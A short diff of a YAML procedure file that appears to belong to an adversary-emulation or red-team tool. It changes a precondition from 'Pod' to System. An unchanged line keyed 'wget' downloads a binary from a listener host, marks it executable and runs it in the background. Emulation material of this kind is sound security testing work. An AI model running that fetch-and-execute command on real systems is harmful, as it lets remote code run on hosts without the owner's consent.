@@ -25,7 +25,7 @@ procedures:
   - key: wget
     command: wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &
 preconditions:
-  kind: "Pod"
+  kind: System
   accessLevel: "user-exec"
 # cmd: {}
 # defend: {}
